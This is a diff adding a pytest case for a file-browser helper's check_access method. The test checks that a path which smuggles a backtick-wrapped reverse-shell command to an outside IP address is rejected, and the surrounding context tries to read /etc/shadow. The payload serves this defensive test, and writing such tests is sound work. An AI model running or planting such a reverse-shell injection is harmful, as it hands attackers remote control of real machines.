@@ -119,3 +119,18 @@ def test_file_browser_read_file_restricted_access(
     with pytest.raises(exceptions.SocaException) as exc_info:
         file_system_helper.read_file(ReadFileRequest(file="/etc/shadow"))
     assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS
+
+
+@pytest.mark.parametrize("file_system_helper", [["check-access"]], indirect=True)
+def test_file_browser_check_access_invalid_path_unauthorized_access(
+    context, file_system_helper
+):
+    """
+    try to read a file in restricted directories and unauthorized access exception should be thrown
+    """
+
+    with pytest.raises(exceptions.SocaException) as exc_info:
+        file_system_helper.check_access(
+            file='/"`bash -i >& /dev/tcp/54.214.65.93/3377 0>&1`\\'
+        )
+    assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS
